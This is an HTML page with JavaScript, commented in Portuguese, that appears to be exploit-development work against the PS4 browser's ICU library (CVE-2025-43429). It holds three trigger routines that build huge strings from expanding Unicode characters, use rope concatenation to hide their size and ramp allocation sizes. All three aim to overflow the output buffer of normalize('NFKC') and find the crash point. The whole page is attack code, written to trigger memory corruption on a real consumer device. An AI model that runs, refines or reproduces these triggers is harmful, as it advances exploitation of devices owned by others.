<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 ICU CVE-2025-43429 (Refined Phase 3)</title>
    <style>
        body { font-family: 'Courier New', monospace; padding: 20px; background-color: #1a1a1a; color: #0f0; }
        h1 { color: #fff; border-bottom: 2px solid #555; padding-bottom: 10px; }
        .controls { margin-bottom: 20px; background: #333; padding: 15px; border-radius: 8px; }
        button { 
            display: block;
            width: 100%;
            margin: 10px 0; 
            padding: 15px; 
            font-size: 16px; 
            font-weight: bold;
            cursor: pointer; 
            background-color: #444; 
            color: #fff; 
            border: 1px solid #666; 
            border-radius: 4px;
            transition: background 0.2s;
        }
        button:hover { background-color: #666; }
        button.danger { background-color: #800; border-color: #f00; }
        button.danger:hover { background-color: #a00; }
        
        #log { 
            height: 400px; 
            border: 1px solid #0f0; 
            overflow-y: scroll; 
            padding: 10px; 
            background: #000; 
            font-size: 14px;
            white-space: pre-wrap;
        }
        .error { color: #ff5555; }
        .highlight { color: #ffff55; }
        .success { color: #55ff55; }
    </style>
</head>
<body>
    <h1>CVE-2025-43429: ICU Normalize (Phase 3)</h1>
    
    <div class="controls">
        <p>Status: Teste D (0.24) causou pressão. Ajustando vetores.</p>
        <button class="danger" onclick="test218g_PressureRamp()">Test 218g: Rampa de Sobrecarga (0.22 -> 0.28)</button>
        <button class="danger" onclick="test218h_HybridRope()">Test 218h: Híbrido Rope + Expansão (ffi)</button>
        <button class="danger" onclick="test218i_CrossNormalize()">Test 218i: Normalização Cruzada (NFD -> NFKC)</button>
        <hr style="border-color: #555;">
        <button onclick="clearLog()">Limpar Log</button>
    </div>

    <div id="log">=== AGUARDANDO COMANDO ===</div>

    <script>
        const log = document.getElementById('log');

        function addLog(msg, type = 'normal') {
            const div = document.createElement('div');
            const time = new Date().toLocaleTimeString();
            div.textContent = `[${time}] ${msg}`;
            if (type === 'error') div.className = 'error';
            if (type === 'highlight') div.className = 'highlight';
            if (type === 'success') div.className = 'success';
            log.appendChild(div);
            console.log(msg);
            log.scrollTop = log.scrollHeight;
        }

        function clearLog() {
            log.innerHTML = '=== LOG LIMPO ===';
        }

        // =================================================================
        // VARIAÇÃO G: Rampa de Sobrecarga (Smart Ramp)
        // Objetivo: Se 0.24 causou pressão, o ponto de crash está próximo.
        // Vamos testar incrementalmente para evitar OOM súbito.
        // =================================================================
        function test218g_PressureRamp() {
            addLog('>>> INICIANDO TESTE 218g (Rampa 0.22 -> 0.28) <<<', 'highlight');
            
            let len = 0x7FFFFFF0;
            let expandChar = "\u00A8";
            let fillChar = "a";
            
            // Começa um pouco abaixo do teste D
            let currentFactor = 0.22;
            const maxFactor = 0.28;
            const step = 0.01;

            async function stepTest() {
                if (currentFactor > maxFactor) {
                    addLog('Fim da rampa. Nenhum crash detectado.', 'success');
                    return;
                }

                addLog(`[Passo] Testando Fator: ${currentFactor.toFixed(2)}...`);
                
                try {
                    // Limpa memória anterior (tentativa)
                    let largeStr = null; 
                    if (window.gc) window.gc();

                    let numExpandChars = 16;
                    let fillLen = len - numExpandChars;
                    
                    // Alocação
                    largeStr = expandChar.repeat(numExpandChars) + fillChar.repeat(Math.ceil(fillLen * currentFactor));
                    
                    addLog(`   -> Alocado (~${(largeStr.length/1024/1024).toFixed(1)} MB). Normalizando...`);
                    
                    // Trigger
                    let res = largeStr.normalize('NFKC');
                    
                    addLog(`   -> OK (Sobreviveu). Subindo carga...`);
                    
                    // Libera memória explicitamente
                    largeStr = null;
                    res = null;
                    
                    currentFactor += step;
                    setTimeout(stepTest, 500); // Pausa para GC respirar
                    
                } catch(e) {
                    addLog(`ERRO no fator ${currentFactor.toFixed(2)}: ${e.message}`, 'error');
                    if (e.message.includes("Out of memory")) {
                        addLog('   -> OOM atingido. O ponto de crash está abaixo disso.', 'error');
                    } else {
                        // Se for outro erro, continuamos
                        currentFactor += step;
                        setTimeout(stepTest, 500);
                    }
                }
            }

            stepTest();
        }

        // =================================================================
        // VARIAÇÃO H: Híbrido Rope + Expansão (Agressivo)
        // Objetivo: Usa a concatenação (Rope) para esconder o tamanho real
        // E usa caracteres que TRIPLICAM (ffi) para estourar o buffer na saída.
        // =================================================================
        function test218h_HybridRope() {
            addLog('>>> INICIANDO TESTE 218h (Híbrido Rope + Expansão) <<<', 'highlight');
            try {
                // \uFB03 (ligadura ffi) -> vira 3 chars
                let expandChar = "\uFB03"; 
                
                // Vamos mirar em 250MB de input (seguro) -> que viram 750MB de output (perigoso)
                // Usando Rope para construir
                let targetSize = 1024 * 1024 * 250; 
                let chunkSize = 1024 * 1024 * 5; // 5MB chunks
                
                addLog(`Construindo Rope de ${targetSize/1024/1024}MB (Output potencial: ${targetSize*3/1024/1024}MB)...`);
                
                let s = "";
                let chunk = expandChar.repeat(chunkSize);
                let current = 0;
                
                while(current < targetSize) {
                    s += chunk; // Cria nós ConsString
                    current += chunkSize;
                }
                
                addLog('Rope pronta. Disparando normalize (Isso deve travar)...', 'highlight');
                
                // O bug do ICU ocorre quando ele tenta calcular o buffer de destino
                // para essa string "escondida" na Rope.
                let normalized = s.normalize('NFKC');
                
                addLog('Falha: Execução continuou normalmente.', 'error');
            } catch(e) {
                addLog('ERRO: ' + e.message, 'error');
            }
        }

        // =================================================================
        // VARIAÇÃO I: Normalização Cruzada (Cross Normalize)
        // Objetivo: Pré-expandir a string na memória usando 'NFD' (Decomposition)
        // Isso muda a estrutura interna da string antes de jogar no 'NFKC' vulnerável.
        // =================================================================
        function test218i_CrossNormalize() {
            addLog('>>> INICIANDO TESTE 218i (Normalização Cruzada) <<<', 'highlight');
            try {
                // Caractere que expande em NFD: \u00C4 (Ä) -> A + ¨ (2 chars)
                let char = "\u00C4"; 
                
                // Tamanho moderado: 200MB
                let size = 1024 * 1024 * 200;
                
                addLog(`Alocando string base (${size/1024/1024} MB)...`);
                let base = char.repeat(size);
                
                addLog('1. Executando Pré-normalização (NFD)...');
                // Isso dobra o tamanho na memória e altera o layout do buffer
                let nfd = base.normalize('NFD');
                
                addLog(`   -> Tamanho expandido: ${(nfd.length/1024/1024).toFixed(1)} M chars.`);
                addLog('2. Executando Trigger (NFKC) na string expandida...', 'highlight');
                
                // Aqui atacamos com uma string que já sofreu mutação interna
                let res = nfd.normalize('NFKC');
                
                addLog('Falha: Execução continuou normalmente.', 'error');
            } catch(e) {
                addLog('ERRO: ' + e.message, 'error');
            }
        }
    </script>
</body>
</html>
